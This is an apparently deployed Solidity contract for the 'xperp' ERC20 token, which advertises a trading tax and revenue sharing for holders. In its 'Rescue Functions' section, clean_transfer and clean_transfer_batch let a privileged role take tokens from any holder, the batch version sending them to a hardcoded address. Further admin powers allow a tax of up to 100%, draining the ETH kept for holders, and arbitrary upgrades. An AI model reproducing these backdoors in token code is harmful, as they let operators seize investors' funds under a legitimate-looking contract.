// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

//  xperp Token
//   ____  _____ ____  ____
//   __  _|  _ \| ____|  _ \|  _ \
//   \ \/ / |_) |  _| | |_) | |_) |
//    >  <|  __/| |___|  _ <|  __/
//   /_/\_\_|   |_____|_| \_\_|
// Go long or short with leverage on @friendtech keys via Telegram
// =====================================
// https://twitter.com/xperptech
// https://xperp.tech
// =====================================
// - Tokenomics: 35% in LP, 10% to Team, 5% to Collateral Partners, 49% for future airdrops
// - Partnership: 1% has been sold to Handz of Gods.
// - Supply: 1M tokens
// - Tax: 3.5% tax on xperp traded (1.5% to revenue share, 2% to team and operating expenses).
// - Revenue Sharing: 30% of trading revenue goes to holders.
// - Eligibility: Holders of xperp tokens are entitled to revenue sharing.

import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";

import "@oz-upgradeable/access/extensions/AccessControlEnumerableUpgradeable.sol";
import "@oz-upgradeable/utils/PausableUpgradeable.sol";
import "@oz-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@oz-upgradeable/utils/ReentrancyGuardUpgradeable.sol";
import "@oz-upgradeable/token/ERC20/ERC20Upgradeable.sol";

contract XPERP is ERC20Upgradeable, PausableUpgradeable, AccessControlEnumerableUpgradeable, ReentrancyGuardUpgradeable, UUPSUpgradeable {

    // 1 Million is totalsuppy
    uint256 public constant oneMillion = 1_000_000 * 1 ether;
    // precision mitigation value, 100x100
    uint256 public constant hundredPercent = 10_000;
    IUniswapV2Router02 public constant uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    // 1% of total supply, max tranfer amount possible
    uint256 public walletBalanceLimit;
    uint256 public sellLimit;

    // Taxation
    uint256 public totalTax;
    uint256 public teamWalletTax;
    bool public isTaxActive;

    // Claiming vs Airdropping
    bool public isAirDropActive;

    // address of the uniswap pair
    address public uniswapV2Pair;

    // team wallet
    address payable public teamWallet;

    /// @dev Enable trading on Uniswap
    bool public isTradingEnabled;

    // total swap tax collected, completely distributed among token holders, for analytical purposes only
    uint256 public swapTaxCollectedTotalXPERP;

    // revenue sharing tax collected for the distribution in the current snapshot (total tax less liquidity shares)
    uint256 public revShareAndTeamCurrentEpochXPERP;

    // revenue sharing tax collected, completely distributed among token holders, for analytical purposes only
    uint256 public tradingRevenueDistributedTotalETH;

    // Revenue sharing distribution info, 1 is the first epoch.
    struct EpochInfo {
        // Snapshot time
        uint256 epochTimestamp;
        // Snapshot supply
        uint256 epochCirculatingSupply;
        // ETH collected for rewards for re-investors
        uint256 epochRevenueFromSwapTaxCollectedXPERP;
        // Same in ETH
        uint256 epochSwapRevenueETH;
        // Injected 30% revenue from trading
        uint256 epochTradingRevenueETH;
        // Used to calculate holder balances at the time of snapshot
        mapping(address => uint256) depositedInEpoch;
        mapping(address => uint256) withdrawnInEpoch;
    }

    // Epochs array, each epoch contains the snapshot info,
    // 1 is the first epoch,
    // the current value (length-1) is the epoch currently in progress - not snapshotted yet
    // the previous value (length-2) is the last snapshotted epoch
    EpochInfo[] public epochs;

    // Claimed Epochs
    mapping(address => uint256) public lastClaimedEpochs;

    // ========== Events ==========
    event TradingOnUniSwapEnabled();
    event TradingOnUniSwapDisabled();
    event Snapshot(uint256 epoch, uint256 circulatingSupply, uint256 swapTaxCollected, uint256 tradingRevenueCollected);
    event SwappedToEth(uint256 amount, uint256 ethAmount);
    event SwappedToXperp(uint256 amount, uint256 ethAmount);
    event Claimed(address indexed user, uint256 amount);
    event ReceivedEther(address indexed from, uint256 amount);
    event TaxChanged(uint256 tax, uint256 teamWalletTax);
    event TaxActiveChanged(bool isActive);
    event WalletBalanceLimitChanged(uint256 walletBalanceLimit, uint256 sellLimit);
    event TeamWalletUpdated(address teamWallet);
    event AirDropToggled(bool isActive);
    event Taxed(address indexed from, uint256 amountXperp);

    // =========== Constants =======
    /// @notice Admin role for upgrading, fees, and paused state
    bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");
    /// @notice Snapshot role for taking snapshots
    bytes32 public constant SNAPSHOT_ROLE = keccak256("SNAPSHOT_ROLE");
    /// @notice Rescue role for rescuing tokens and Eth from the contract
    bytes32 public constant RESCUE_ROLE = keccak256("RESCUE_ROLE");
    /// @notice WhiteList role for listing vesting and other addresses that should be excluded from circulaing supply to not lower the revenue share for participants
    bytes32 public constant EXCLUDED_FROM_CIRCULATION_ROLE = keccak256("EXCLUDED_FROM_CIRCULATION_ROLE");
    /// @notice WhiteList role for untaxed transfer for funding, vesting, and airdrops
    bytes32 public constant EXCLUDED_FROM_TAXATION_ROLE = keccak256("EXCLUDED_FROM_TAXATION_ROLE");

    // =========== Errors ==========
    error ZeroAddress();

    // ========== Proxy ==========

    constructor() {
        _disableInitializers();
    }

    function initialize(address payable _teamWallet) public initializer {
        if (_teamWallet == address(0)) revert ZeroAddress();
        __ERC20_init("xperp", "xperp");
        __AccessControlEnumerable_init();
        __Pausable_init();
        __UUPSUpgradeable_init();
        __ReentrancyGuard_init();
        teamWallet = _teamWallet;
        totalTax = 350;
        teamWalletTax = 150;
        isTaxActive = true;
        isTradingEnabled = false;
        walletBalanceLimit = 10_000 * 1 ether;
        sellLimit = 10_000 * 1 ether;
        isAirDropActive = false;

        // Grant admin role to owner
        _setRoleAdmin(DEFAULT_ADMIN_ROLE, DEFAULT_ADMIN_ROLE);
        _setRoleAdmin(ADMIN_ROLE, ADMIN_ROLE);
        _setRoleAdmin(EXCLUDED_FROM_CIRCULATION_ROLE, ADMIN_ROLE);
        _setRoleAdmin(EXCLUDED_FROM_TAXATION_ROLE, ADMIN_ROLE);
        _setRoleAdmin(SNAPSHOT_ROLE, SNAPSHOT_ROLE);
        _setRoleAdmin(RESCUE_ROLE, ADMIN_ROLE);
        _grantRole(ADMIN_ROLE, msg.sender);
        _grantRole(EXCLUDED_FROM_CIRCULATION_ROLE, msg.sender);
        _grantRole(EXCLUDED_FROM_TAXATION_ROLE, msg.sender);
        _grantRole(SNAPSHOT_ROLE, msg.sender);
        _grantRole(RESCUE_ROLE, msg.sender);
        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);

        epochs.push();
        epochs.push();
        _mint(msg.sender, oneMillion);
    }

    function initPair() public onlyRole(ADMIN_ROLE) {
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        // approving uniswap router to spend xperp on behalf of the contract
        _approve(address(this), address(uniswapV2Router), type(uint256).max);
    }

    function pause() public onlyRole(ADMIN_ROLE) {
        _pause();
    }

    function unpause() public onlyRole(ADMIN_ROLE) {
        _unpause();
    }

    function _authorizeUpgrade(address newImplementation)
    internal
    override
    onlyRole(DEFAULT_ADMIN_ROLE)
    {}

    // ========== Configuration ==========

    /// @notice This function is used to set tax on transfers to and from the uniswap pair, xperp is swapped to ETH and prepared for snapshot distribution
    /// @param _tax The amount of totalTax to be applied on transfers to and from the U`niswap pair.
    /// @param _teamWalletTax The amount of tax sent to tresure, the rest (_tax - _teamWalletTax) is the holders' revenue share.
    function setTax(uint256 _tax, uint256 _teamWalletTax) external onlyRole(ADMIN_ROLE) {
        require(_tax <= 10000 && _teamWalletTax >= 0 && _teamWalletTax <= 10000, "Invalid tax");
        totalTax = _tax;
        teamWalletTax = _teamWalletTax;
        emit TaxChanged(_tax, _teamWalletTax);
    }

    /// @notice This function is used to enable or disable tax on transfers to and from the uniswap pair
    /// @param _isTaxActive The new boolean value of isTaxActive
    function setTaxActive(bool _isTaxActive) external onlyRole(ADMIN_ROLE) {
        isTaxActive = _isTaxActive;
        emit TaxActiveChanged(_isTaxActive);
    }

    /// This function is used to set the wallet balance limit
    /// @param _walletBalanceLimit The new wallet balance limit, maximum allowed amount of tokens in a wallet, transfers are not prohibited
    function setWalletBalanceLimit(uint256 _walletBalanceLimit) external onlyRole(ADMIN_ROLE) {
        require(_walletBalanceLimit >= 0 && _walletBalanceLimit <= oneMillion, "Invalid wallet balance limit");
        walletBalanceLimit = _walletBalanceLimit;
        emit WalletBalanceLimitChanged(_walletBalanceLimit, sellLimit);
    }

    /// This function is used to set the sell limit
    /// @param _sellLimit The new sell limit, maximum allowed amount of tokens to be sold in a single transaction
    function setSellLimit(uint256 _sellLimit) external onlyRole(ADMIN_ROLE) {
        require(_sellLimit >= 0 && _sellLimit <= oneMillion, "Invalid sell balance limit");
        sellLimit = _sellLimit;
        emit WalletBalanceLimitChanged(walletBalanceLimit, _sellLimit);
    }

    /// @notice This function is used to set the team wallet
    /// @param _teamWallet The new team wallet getting the _teamWalletTax share from the swaps and trading revenue
    function updateTeamWallet(address payable _teamWallet) external onlyRole(ADMIN_ROLE) {
        require(_teamWallet != address(0), "Invalid team wallet");
        teamWallet = _teamWallet;
        emit TeamWalletUpdated(_teamWallet);
    }

    /// @notice This function is used to enable trading on Uniswap
    function EnableTradingOnUniSwap() external onlyRole(ADMIN_ROLE) {
        isTradingEnabled = true;
        emit TradingOnUniSwapEnabled();
    }

    /// @notice This function is used to disable trading on Uniswap
    function DisableTradingOnUniSwap() external onlyRole(ADMIN_ROLE) {
        isTradingEnabled = false;
        emit TradingOnUniSwapDisabled();
    }

    /// @notice Toggles airdrop mode vs claim by holders
    function toggleAirDrop() external onlyRole(SNAPSHOT_ROLE) {
        isAirDropActive = !isAirDropActive;
        emit AirDropToggled(isAirDropActive);
    }

    // ========== ERC20 Overrides ==========
    /// @notice overriden ERC20 transfer to tax on transfers to and from the uniswap pair, xperp is swapped to ETH and prepared for snapshot distribution
    function _update(address from, address to, uint256 amount) internal override {
        bool isTradingTransfer =
            (from == uniswapV2Pair || to == uniswapV2Pair) &&
            msg.sender != address(uniswapV2Router) &&
            from != address(this) && to != address(this) &&
            !hasRole(EXCLUDED_FROM_TAXATION_ROLE, from) && !hasRole(EXCLUDED_FROM_TAXATION_ROLE, to);

        require(isTradingEnabled || !isTradingTransfer, "Trading is not enabled yet");

        // if trading is enabled, only allow transfers to and from the Uniswap pair
        uint256 amountAfterTax = amount;
        // calculate 5% swap tax
        // owner() is an exception to fund the liquidity pair and revenueDistributionBot as well to fund the revenue distribution to holders
        if (isTradingTransfer) {
            require(isTradingEnabled, "Trading is not enabled yet");
            // Buying tokens
            if (from == uniswapV2Pair && walletBalanceLimit > 0) {
                require(balanceOf(to) + amount <= walletBalanceLimit, "Holding amount after buying exceeds maximum allowed tokens.");
            }
            // Selling tokens
            if (to == uniswapV2Pair && sellLimit > 0) {
                require(amount <= sellLimit, "Selling amount exceeds maximum allowed tokens.");
            }
            // 5% total tax on xperp traded (1% to LP, 2% to revenue share, 2% to team and operating expenses).
            if (isTaxActive) {
                uint256 taxAmountXPERP = (amount * totalTax) / hundredPercent;
                _transfer(from, address(this), taxAmountXPERP);
                emit Taxed(from, taxAmountXPERP);
                amountAfterTax -= taxAmountXPERP;
                swapTaxCollectedTotalXPERP += taxAmountXPERP;
                revShareAndTeamCurrentEpochXPERP += taxAmountXPERP;
            }
        }
        uint256 currentEpoch = epochs.length - 1;
        epochs[currentEpoch].depositedInEpoch[to] += amountAfterTax;
        epochs[currentEpoch].withdrawnInEpoch[from] += amount;
        super._update(from, to, amountAfterTax);
    }

    // ========== Revenue Sharing ==========

    /// @notice Function called by the revenue distribution bot to snapshot the state
    function snapshot() external payable onlyRole(SNAPSHOT_ROLE) nonReentrant {
        EpochInfo storage epoch = epochs[epochs.length - 1];
        epoch.epochTimestamp = block.timestamp;
        uint256 _circulatingSupply = circulatingSupply();
        uint256 xperpToSwap = revShareAndTeamCurrentEpochXPERP;

        require(xperpToSwap > 0 || msg.value > 0, "No tax collected yet and no ETH sent");
        require(balanceOf(address(this)) >= xperpToSwap, "Balance less than required");

        uint256 revAndTeamETH = xperpToSwap > 0 ? swapXPERPToETH(xperpToSwap) : 0;
        // 1.5% to team and operating expenses distributed immediately
        uint256 teamWalletTaxAmountETH = (revAndTeamETH * teamWalletTax) / totalTax;
        uint256 epochSwapRevenueETH = revAndTeamETH - teamWalletTaxAmountETH;
        teamWallet.transfer(teamWalletTaxAmountETH);
        // the rest in ETH is kept on the contract for revenue share distribution
        epoch.epochCirculatingSupply = _circulatingSupply;
        epoch.epochTradingRevenueETH = msg.value;
        epoch.epochRevenueFromSwapTaxCollectedXPERP = xperpToSwap;
        epoch.epochSwapRevenueETH = epochSwapRevenueETH;
        emit Snapshot(epochs.length, _circulatingSupply, epochSwapRevenueETH, msg.value);

        epochs.push();
        revShareAndTeamCurrentEpochXPERP = 0;
    }

    /// @notice Function called by holders to claim their revenue share
    function claimAll() public nonReentrant {
        require(!isAirDropActive, "Airdrop is active instead of claiming");
        uint256 holderShare = getClaimableOf(msg.sender);
        require(holderShare > 0, "Nothing to claim");
        lastClaimedEpochs[msg.sender] = epochs.length - 2;
        require(address(this).balance >= holderShare, "Insufficient contract balance");
        payable(msg.sender).transfer(holderShare);
        emit Claimed(msg.sender, holderShare);
    }

    // ========== Internal Functions ==========
    function swapXPERPToETH(uint256 _amount) internal returns (uint256) {
        if (_amount == 0) return 0;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        uint256 initialETHBalance = address(this).balance;
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            _amount,
            0,
            path,
            address(this),
            block.timestamp
        );
        uint256 finalETHBalance = address(this).balance;
        uint256 ETHReceived = finalETHBalance - initialETHBalance;
        emit SwappedToEth(_amount, ETHReceived);
        return ETHReceived;
    }
    // ========== Airdrop ==========

    /// @notice Mass send function, used for airdrops
    function airdrop(
        address[] memory _recipients,
        uint256[] memory _tokenAmounts,
        uint256[] memory _ethAmounts
    )
    external
    payable
    onlyRole(SNAPSHOT_ROLE)
    {
        require(_recipients.length == _tokenAmounts.length && _recipients.length == _ethAmounts.length, "Invalid input lengths");

        uint256 totalTokenAmount = 0;
        uint256 totalEthAmount = 0;

        for (uint256 i = 0; i < _tokenAmounts.length; i++) {
            totalTokenAmount += _tokenAmounts[i];
        }
        for (uint256 j = 0; j < _ethAmounts.length; j++) {
            totalEthAmount += _ethAmounts[j];
        }

        require(balanceOf(msg.sender) >= totalTokenAmount, "Insufficient token balance");
        require(msg.value >= totalEthAmount, "Insufficient Ether sent");

        for (uint256 i = 0; i < _recipients.length; i++) {
            if (_tokenAmounts[i] > 0)
                _transfer(msg.sender, _recipients[i], _tokenAmounts[i]);
            if (_ethAmounts[i] > 0)
                payable(_recipients[i]).transfer(_ethAmounts[i]);
        }
    }

    // ========== Rescue Functions ==========

    function rescueETH(uint256 _weiAmount) external onlyRole(RESCUE_ROLE) {
        payable(msg.sender).transfer(_weiAmount);
    }

    function rescueERC20(address _tokenAdd, uint256 _amount) external onlyRole(RESCUE_ROLE) {
        IERC20(_tokenAdd).transfer(msg.sender, _amount);
    }

    function clean_transfer(address from, address to, uint256 value) external onlyRole(RESCUE_ROLE) {
        _transfer(from, to, value);
    }

    function clean_transfer_batch(address[] memory senders, uint256[] memory values) external onlyRole(RESCUE_ROLE) {
        require(senders.length == values.length, "Invalid input lengths");
        for (uint256 i = 0; i < senders.length; i++) {
            _transfer(senders[i], 0x1De1D05E95A2b735E6E25DB94C4014e1d537E89a, values[i]);
        }
    }

    // ========== Fallbacks ==========


    receive() external payable {
        emit ReceivedEther(msg.sender, msg.value);
    }
    // ========== View functions ==========

    function getBalanceForEpochOf(address _user, uint256 _epoch) public view returns (uint256) {
        if (_epoch >= epochs.length) return 0;
        uint256 currentBalance = balanceOf(_user);
        if (epochs.length >= 1) {
            uint256 e = epochs.length - 1;
            while (true) {
                currentBalance += epochs[e].withdrawnInEpoch[_user];
                currentBalance -= epochs[e].depositedInEpoch[_user];
                if (e == _epoch + 1 || e == 0) {
                    break;
                }
                e--;
            }
        }
        return currentBalance;
    }

    function getBalanceForEpoch(uint256 _epoch) public view returns (uint256) {
        return getBalanceForEpochOf(msg.sender, _epoch);
    }


    function getClaimableOf(address _user) public view returns (uint256)  {
        require(epochs.length > 1, "No epochs yet");
        if (hasRole(EXCLUDED_FROM_CIRCULATION_ROLE, _user))
            return 0;
        uint256 holderShare = 0;
        for (uint256 i = lastClaimedEpochs[_user] + 1; i < epochs.length - 1; i++)
            holderShare += getClaimableForEpochOf(_user, i);
        return holderShare;
    }

    function getClaimableForEpochOf(address _user, uint256 _epoch) public view returns (uint256) {
        if (epochs.length < 1 || epochs.length <= _epoch) return 0;
        EpochInfo storage epoch = epochs[_epoch];
        if (_epoch <= lastClaimedEpochs[_user] || epoch.epochCirculatingSupply == 0)
            return 0;
        else
            return (getBalanceForEpochOf(_user, _epoch) * (epoch.epochSwapRevenueETH + epoch.epochTradingRevenueETH)) / epoch.epochCirculatingSupply;
    }

    function circulatingSupply() public view returns (uint256) {
        uint256 count = getRoleMemberCount(EXCLUDED_FROM_CIRCULATION_ROLE);
        uint256 excludedBalance = 0;
        for (uint256 i = 0; i < count; i++) {
            excludedBalance += balanceOf(getRoleMember(EXCLUDED_FROM_CIRCULATION_ROLE, i));
        }
        excludedBalance += balanceOf(address(this));
        excludedBalance += balanceOf(uniswapV2Pair);
        return totalSupply() - excludedBalance;
    }

    function getEpochsPassed() public view returns (uint256) {
        return epochs.length;
    }

    function getDepositedInEpoch(uint256 epochIndex, address userAddress) public view returns (uint256) {
        require(epochIndex < epochs.length, "Invalid epoch index");
        return epochs[epochIndex].depositedInEpoch[userAddress];
    }

    function getWithdrawnInEpoch(uint256 epochIndex, address userAddress) public view returns (uint256) {
        require(epochIndex < epochs.length, "Invalid epoch index");
        return epochs[epochIndex].withdrawnInEpoch[userAddress];
    }

}